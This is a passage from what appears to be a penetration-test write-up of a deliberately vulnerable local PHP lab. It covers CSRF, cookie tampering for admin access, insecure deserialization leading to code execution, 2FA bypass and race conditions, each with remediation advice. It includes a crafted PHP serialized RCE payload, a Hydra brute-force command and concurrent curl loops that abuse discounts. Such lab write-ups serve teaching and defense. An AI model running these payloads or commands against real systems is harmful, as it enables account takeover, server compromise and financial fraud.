The application allows users to follow accounts using a GET request without CSRF protection, enabling forced follow actions.

### Affected Functionality
- Follow User Feature

### Proof of Concept (PoC)
An attacker can trigger the follow action using:

GET /lab/csrf/follow/index.php?follow=follow

pgsql
Copy code

When a logged-in user accesses the link, the follow action is executed automatically.

### Impact
- Unauthorized social interactions
- Manipulation of follower lists
- Loss of user trust

### Root Cause
- CSRF-vulnerable GET request
- Missing anti-CSRF tokens
- No Origin or Referer validation

---

## Conclusion

Multiple CSRF vulnerabilities were identified across critical application functionalities. The lack of CSRF protections allows attackers to perform sensitive actions such as password changes, money transfers, and social interactions without user consent.
<img width="956" height="947" alt="follow1" src="https://github.com/user-attachments/assets/86c758b8-cf8e-4b32-b14e-e7d12acef8f7" />
<img width="1920" height="954" alt="follow" src="https://github.com/user-attachments/assets/40d80d18-84b7-4ad5-9cd4-aeb174bdf455" />

#### 5.9.1 Insecure Design – Admin Account Access

#### Severity
High

#### CVSS v3.1 Score
8.0 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N)

#### Affected Component
Admin account authentication and session management mechanism.

#### Description
An insecure design vulnerability was identified in the admin account functionality of the application. The application relies on a client-side controlled cookie value to determine whether a user is authenticated as an administrator.

By modifying or replaying the authentication cookie in the browser, an attacker can gain unauthorized access to the admin account without providing valid admin credentials. The application does not enforce proper server-side validation of user roles or session integrity.

As a result, an attacker can directly access privileged admin functionality, bypassing the intended authentication and authorization controls.

#### Root Cause
The application design incorrectly trusts client-side data (cookies) to determine user identity and privilege level. There is no secure server-side verification of the user role, nor any integrity protection (such as signing or validation) applied to sensitive session values.

#### Proof of Concept
1. Log in as a normal user.
2. Open the browser developer tools and navigate to **Application → Cookies**.
3. Observe the presence of a role-related or authentication cookie.
4. Modify or reuse the admin-related cookie value.
5. Refresh the page or navigate to the admin account endpoint.
6. The application grants admin-level access and displays:
<img width="1920" height="763" alt="admin_account1" src="https://github.com/user-attachments/assets/8c72517f-f975-4df1-9018-683273c507fe" />
<img width="1920" height="470" alt="admin_account" src="https://github.com/user-attachments/assets/450f264e-2c20-4dc0-82c4-47c1070ea528" />
#### 5.9.2 Insecure Design – Admin Account (Insecure Deserialization)

#### Severity
High

#### CVSS v3.1 Score
8.1 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N)

#### Affected Component
Authentication cookie handling and server-side object deserialization logic.

#### Description
An insecure design vulnerability was identified in the Admin Account v2 functionality where the application relies on a serialized object stored inside a client-side cookie to determine user identity and privilege level.

The cookie value is URL-encoded and Base64-encoded serialized data representing a user object. By decoding the cookie, it was observed that the object contains sensitive attributes such as `username`, `password`, and an `isAdmin` flag.

An attacker can modify this serialized object, change the `isAdmin` value, re-encode the payload, and resend it to the server. The application blindly deserializes the object without integrity validation and grants administrative access based on the manipulated data.

This results in full administrative account takeover without valid credentials.

#### Root Cause
The application deserializes user-controlled data without validation or integrity protection. Sensitive authorization decisions are made directly from deserialized object attributes stored in client-side cookies, violating secure design principles.

No cryptographic signing, server-side session validation, or role verification is enforced before granting admin privileges.

#### Proof of Concept
1. Access the application as a normal user.
2. Open browser developer tools and navigate to **Application → Cookies**.
3. Extract the authentication cookie value.
4. Decode the value using URL decoding followed by Base64 decoding.
5. The decoded payload reveals a serialized object similar to:

O:4:"User":3:{
s:8:"username";s:32:"098f6bcd4621d373cade4e832627b4f6";
s:8:"password";s:32:"098f6bcd4621d373cade4e832627b4f6";
s:7:"isAdmin";i:0;
}

markdown
Copy code

6. Modify the `isAdmin` value from `0` to `1`.
7. Re-serialize, Base64-encode, and URL-encode the payload.
8. Replace the original cookie value with the modified one.
9. Refresh the page.

The application grants administrative access and displays:

Welcome Admin

nginx
Copy code

This confirms successful privilege escalation via insecure deserialization.
<img width="1920" height="685" alt="admin_account_v22" src="https://github.com/user-attachments/assets/aa1e9d40-f0bd-45b7-a279-1f1e4087d005" />
<img width="1920" height="685" alt="admin_account_v21" src="https://github.com/user-attachments/assets/36f0be3c-ad50-4497-8175-9b6d9d1ceaf6" />
<img width="1920" height="685" alt="admin_account_v2" src="https://github.com/user-attachments/assets/ee4b9d24-6363-4bba-a2ed-61a356355be9" />

## 5.9.3 Full Privileges – Insecure Design (Insecure Deserialization & Client-Side Authorization Trust)

### Vulnerability Description
The application determines user permissions based on a **client-side serialized object stored in cookies**. This object contains authorization flags such as delete, update, and add permissions. Since the application **trusts and deserializes this data without server-side validation**, an attacker can modify the cookie to grant themselves full privileges.

This represents an **insecure design flaw**, where authorization logic is delegated to client-controlled data.

---

### Proof of Concept (PoC)

1. Intercept the authentication/authorization cookie.
2. Decode the cookie value using:
   - URL Decode
   - Base64 Decode
3. Modify the serialized object to enable all permissions:
   - `canDelete = 1`
   - `canUpdate = 1`
   - `canAdd = 1`
4. Re-encode the object (Base64 + URL Encode).
5. Replace the cookie value in the browser and refresh the page.

**Observed Result:**
- Delete: Yes  
- Update: Yes  
- Add: Yes  
- Application confirms: *“You have all the privileges”*

---

### Impact
- Full privilege escalation
- Unauthorized administrative access
- Ability to modify or delete application data
- Complete compromise of application integrity

---

### Root Cause
- Trusting client-side authorization data
- Insecure deserialization of user-controlled objects
- Missing server-side permission enforcement

---

### CVSS 3.1 Score
**Score:** 9.8 (Critical)  
**Vector:**
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H

yaml
Copy code

---

### Recommendation
- Never store authorization or permission data on the client
- Avoid deserializing untrusted data
- Enforce authorization strictly on the server side
- Use secure, server-managed sessions for role validation
- Implement integrity protection for session data (e.g., signed tokens)
<img width="1919" height="669" alt="full_privlages1" src="https://github.com/user-attachments/assets/8999a1c7-716e-4ad0-95d5-4a34ff7e32d0" />
<img width="1919" height="669" alt="full_privlages" src="https://github.com/user-attachments/assets/1a54a9f5-96b2-47a3-8dcb-172f997785d4" />

## 5.9.4 Insecure Deserialization – Random Nick Generator

### Vulnerability Title
Insecure Deserialization Leading to Remote Code Execution (RCE)

---

### Description
The **Random Nick Generator** functionality accepts serialized PHP objects from the client side and processes them using the `unserialize()` function without proper validation or integrity checks. An attacker can modify the serialized object to inject malicious properties, resulting in arbitrary command execution on the server.

---

### Affected Component
- Feature: Random Nick Generator  
- Backend Language: PHP  
- Vulnerable Function: `unserialize()`  

---

### Root Cause
The application:
- Trusts user-supplied serialized PHP objects
- Performs deserialization without:
  - Class whitelisting
  - Object integrity verification
  - Signature validation
- Uses attacker-controlled object properties in a dangerous sink (`system()`)

---

### Proof of Concept (PoC)

#### Step 1: Crafted Serialized Payload
```php
O:4:"User":6:{
s:8:"username";s:4:"test";
s:2:"id";s:8:"password";
N;
s:16:"generatedStrings";a:2:{
i:0;s:4:"test";
i:1;s:14:"test1179108668";
}
s:7:"command";s:6:"system";
s:8:"fileName";s:19:"randomGenerator.php";
s:13:"fileExtension";s:3:"php";
}
```
Step 2: Base64 Encoding
The above serialized object was Base64-encoded and injected into the vulnerable parameter/cookie.

Step 3: Command Execution Confirmation
The application returned the following output in the response:

text
Copy code
uid=33(www-data) gid=33(www-data) groups=33(www-data)
Impact
Remote Code Execution on the server

Execution context: www-data

Attacker can:

Execute arbitrary system commands

Read sensitive files

Pivot to further compromise the server

Severity
Critical

CVSS v3.1 Score
9.8 (Critical)

Vector:
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H

Remediation
Avoid using unserialize() on untrusted data

Use json_encode() / json_decode() instead

Implement strict class whitelisting if deserialization is required

Sign and verify serialized data before processing

Disable dangerous PHP functions such as system(), exec(), shell_exec()

<img width="1920" height="853" alt="random_nic1" src="https://github.com/user-attachments/assets/9b523089-54da-46e8-af4f-7c3257c87535" />
<img width="1920" height="722" alt="random_nic" src="https://github.com/user-attachments/assets/963d8726-aba1-4edf-bf45-63b9c7c8bdab" />

## 5.10.1 Broken Authentication – Brute Force Attack

### Vulnerability Title
Broken Authentication via Credential Brute Force

---

### Description
The login functionality is vulnerable to a **brute force attack** due to the absence of rate limiting, account lockout mechanisms, or CAPTCHA protections. An attacker can repeatedly attempt different password combinations for a valid username until correct credentials are discovered.

---

### Affected Component
- Feature: Login Authentication
- Endpoint: `/lab/broken-authentication/brute-force/`
- Method: HTTP POST

---

### Root Cause
The application:
- Does not enforce rate limiting on login attempts
- Does not lock accounts after multiple failed attempts
- Allows unlimited authentication requests from a single source
- Returns consistent error messages for failed logins

---

### Proof of Concept (PoC)

#### Step 1: Known Username
```text
admin
Step 2: Brute Force Using Hydra
bash
Copy code
hydra -l admin \
-P /usr/share/wordlists/seclists/Passwords/Common-Credentials/10k-most-common.txt \
localhost -s 1337 \
http-post-form "/lab/broken-authentication/brute-force/:username=^USER^&password=^PASS^:Wrong Password" \
-t 16
```
Step 3: Successful Credential Discovery
Hydra successfully identified valid login credentials:

text
Copy code
login: admin
password: lifehack
Impact
Unauthorized access to the admin account

Complete authentication bypass

Potential access to sensitive data and administrative features

Increased risk of privilege escalation and further compromise

Severity
High

CVSS v3.1 Score
8.8 (High)

Vector:
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:L

Remediation
Implement rate limiting on authentication endpoints

Enforce account lockout after multiple failed login attempts

Add CAPTCHA after consecutive failures

Use generic error messages for authentication failures

Monitor and alert on abnormal login activity

Conclusion
The application is vulnerable to Broken Authentication due to missing brute force protections. An attacker can successfully compromise privileged accounts using automated tools such as Hydra. Immediate remediation is required to secure the authentication mechanism.

## 5.10.2 Insecure Design – Hardcoded Credentials Authentication Logic

### Vulnerability Title
Insecure Design Due to Hardcoded Credentials and Ineffective Authentication Logic

---

### Description
The authentication mechanism is insecurely designed by using **hardcoded credentials** directly in the application source code. The login logic compares user-supplied input against fixed username and password values instead of validating credentials securely from a backend data store.

This represents an **Insecure Design** issue rather than a traditional injection or brute-force vulnerability.

---

### Affected Component
- Feature: Login Authentication
- File: `login.php`
- Method: HTTP POST

---

### Root Cause
The application:
- Uses hardcoded credentials inside the source code:
  ```php
  $username = "mandalorian";
  $password = "mandalorian";
Performs direct string comparison with user input

Does not use:

Secure password storage (hashing)

Database-backed authentication

Proper access control mechanisms

Relies on client-submitted values for authentication decisions

Proof of Concept (PoC)
Step 1: Inspect Authentication Logic
Reviewing the source code reveals fixed credentials embedded in the application:

php
Copy code
if( $username == $_POST['uname'] && $password == $_POST['passwd'] ){
    header("Location: index.php");
}
Step 2: Login Using Hardcoded Credentials
Submitting the following values successfully authenticates the user:

text
Copy code
Username: mandalorian
Password: mandalorian
Impact
Authentication can be bypassed by anyone with access to the source code

Complete compromise of protected functionality

No ability to revoke or rotate credentials

High risk if the same pattern is reused across environments

Severity
High

CVSS v3.1 Score
8.1 (High)

Vector:
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N

Remediation
Remove hardcoded credentials from source code

Implement database-backed authentication

Store passwords using strong hashing algorithms (bcrypt, Argon2)

Apply proper access control and session handling

Conduct secure design reviews during development

Conclusion
The application demonstrates an Insecure Design flaw by embedding authentication credentials directly in the source code. This design choice enables trivial authentication bypass and exposes the system to unauthorized access.
<img width="960" height="849" alt="no_redirect1" src="https://github.com/user-attachments/assets/3e234f25-ba5e-44b9-b552-0295220ae916" />
<img width="575" height="482" alt="no_redirect" src="https://github.com/user-attachments/assets/27694a4e-abc5-4b5d-8835-4f12b14087e3" />

## 5.10.3 Broken Authentication – Improper Two-Factor Authentication (2FA)

### Vulnerability Title
Broken Authentication Due to Improper 2FA Implementation

---

### Description
The application implements a flawed Two-Factor Authentication (2FA) mechanism where the verification code is generated and stored insecurely in the server-side session without proper validation controls. The 2FA process can be bypassed due to weak session handling and improper enforcement of the verification step.

---

### Affected Component
- Feature: Login with Two-Factor Authentication
- Files:
  - `index.php`
  - `2fa.php`
- Method: HTTP POST
- Session Handling: PHP Sessions

---

### Root Cause
The application suffers from multiple authentication design flaws:
- Credentials are hardcoded (`admin:admin`)
- 2FA code is:
  - Generated using `rand()` (predictable)
  - Stored directly in session
- No binding of 2FA code to:
  - Attempt count
  - Time window
  - Client/IP
- Unlimited attempts allowed for OTP verification
- Session is reset using `session_unset()` without enforcing complete authentication state validation

---

### Proof of Concept (PoC)

#### Step 1: Login with Valid Credentials
```text
Username: admin
Password: admin
```
This redirects the user to the 2FA verification page.

Step 2: Observe 2FA Logic
The following code generates and stores the OTP:

php
Copy code
$randomCode = rand(10000, 99999);
$_SESSION['2fa_code'] = $randomCode;
Step 3: 2FA Bypass
OTP attempts are not rate-limited

OTP is regenerated or session state resets on page reload

Attacker can:

Reattempt OTP verification indefinitely

Bypass the second authentication factor

Impact
Complete bypass of Two-Factor Authentication

Unauthorized access to protected accounts

False sense of security from ineffective 2FA

Increased risk of account compromise

Severity
High

CVSS v3.1 Score
8.4 (High)

Vector:
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N

Remediation
Enforce strict OTP attempt limits

Bind OTP to:

Specific user

Session

Expiration time

Invalidate OTP after a single use

Use cryptographically secure OTP generation

Implement proper authentication state management

Avoid hardcoded credentials


## 5.11.1 Race Condition – Duplicate Registration (TOCTOU)

### Vulnerability Title
Race Condition (Time-of-Check Time-of-Use) in User Registration

---

### Description
The user registration functionality is vulnerable to a **Race Condition (TOCTOU)** vulnerability. The application checks whether an email already exists in the database and then performs an insert operation in separate steps without enforcing transactional integrity or database-level constraints.

By sending multiple concurrent registration requests with the same email address, an attacker can bypass the duplicate email check and create multiple accounts using the same email.

---

### Affected Component
- Feature: User Registration
- File: `index.php`
- Method: HTTP POST
- Database: SQL (PDO)

---

### Root Cause
The vulnerability exists due to:
- Separate **SELECT** and **INSERT** operations
- No database transaction or locking
- No UNIQUE constraint on the `email` column
- Application-level validation relied upon instead of database enforcement

Relevant vulnerable logic:
```php
$kontrolSql = "SELECT * FROM kayit WHERE email = '$email'";
...
$ekleSql = "INSERT INTO kayit (ad, soyad, email, tel) VALUES ('$ad', '$soyad', '$email', '$tel')";
Proof of Concept (PoC)
```
Step 1: Prepare Registration Request
Use a single valid email address and intercept the request.

text
Copy code
email = test@example.com
Step 2: Trigger Race Condition
Send multiple concurrent POST requests using the same session and same email (e.g., using curl, Burp Intruder, or Turbo Intruder).

Example using parallel requests:

bash
Copy code
```for i in {1..10}; do
  curl -X POST http://localhost:1337/lab/race-condition/register/index.php \
  -d "ad=test&soyad=user&email=test@example.com&tel=1234567890" &
done
```
Step 3: Observe Result
Multiple registrations are successfully created

The duplicate email check is bypassed

Application reports successful registration multiple times

Impact
Multiple accounts created with the same email

Business logic abuse

Data integrity compromise

Potential abuse of registration-based features (discounts, voting, rewards)

Severity
High

CVSS v3.1 Score
7.5 (High)

Vector:
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:H/A:N

Remediation
Add a UNIQUE constraint on the email column

Use database transactions with proper locking

Perform atomic operations (INSERT with constraint handling)

Avoid relying solely on application-level validation

Handle duplicate key errors securely
<img width="1218" height="473" alt="race_condition_12" src="https://github.com/user-attachments/assets/3b04f829-444a-4f16-95e4-124d9d0f5ae1" />
<img width="814" height="156" alt="race_condition_1" src="https://github.com/user-attachments/assets/8ae62a2f-2376-4876-aad2-085185a2e627" />

## 5.11.2 Race Condition – Multiple Discount Application in Shopping Cart

### Vulnerability Title
Race Condition in Discount Code Application (Session Lock Bypass)

---

### Description
The shopping cart functionality is vulnerable to a **Race Condition** that allows an attacker to apply the same discount code multiple times. The vulnerability occurs due to improper session locking and delayed session updates during discount validation.

By sending multiple concurrent requests during the discount application window, an attacker can exploit the timing gap to apply the discount repeatedly, resulting in an incorrect or negative cart total.

---

### Affected Component
- Feature: Shopping Cart Discount
- File: `index.php`
- Method: HTTP POST
- Session Handling: PHP Sessions

---

### Root Cause
The vulnerability is caused by:
- Use of `session_write_close()` before critical validation
- Artificial delay using `sleep(3)`
- No atomic enforcement of single discount usage
- Session state (`discount_applied`) checked before it is safely updated

Relevant vulnerable logic:
```php
if (!isset($_SESSION['discount_applied']) && $coupon_code === "sbrvtn50") {
    session_write_close();
    sleep(3);
    session_start();
}
```
This creates a time window where multiple requests can bypass the discount_applied check.

Proof of Concept (PoC)
Step 1: Add Products to Cart
Add any product(s) with total value ≥ 50.

Example:

text
Copy code
Product price: 100
Step 2: Intercept Discount Request
Intercept the discount request containing the coupon code:

text
Copy code
coupon_code = sbrvtn50
Step 3: Trigger Race Condition
Send multiple concurrent POST requests with the same coupon code (using Burp Intruder, Turbo Intruder, or curl):

bash
Copy code
```for i in {1..5}; do
  curl -X POST http://localhost:1337/lab/race-condition/cart/index.php \
  -d "coupon_code=sbrvtn50&apply_discount=1" &
done
```
Step 4: Observe Result
Discount value -50 is added multiple times to the cart

Total amount is reduced incorrectly

Cart total can reach zero or negative values

Impact
Multiple discounts applied using a single coupon

Financial loss to the business

Integrity violation of cart calculations

Abuse of promotional logic

Severity
High

CVSS v3.1 Score
7.6 (High)

Vector:
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N

Remediation
Remove artificial delays (sleep)

Avoid using session_write_close() during critical operations

Apply discounts using atomic server-side logic

Enforce discount usage at database level

Use transaction locks or mutex mechanisms

Validate coupon usage per user/cart atomically

<img width="873" height="862" alt="race_condition22" src="https://github.com/user-attachments/assets/8f106d89-8472-49b8-82cc-fb17bec8a5ed" />
<img width="873" height="182" alt="race_condition21" src="https://github.com/user-attachments/assets/fe1d2e2a-3d48-40a8-bfae-d7b3f7d99c17" />
<img width="1222" height="955" alt="race_condition2" src="https://github.com/user-attachments/assets/a569bc19-45ac-4a97-b1ec-7ac62f156bbd" />

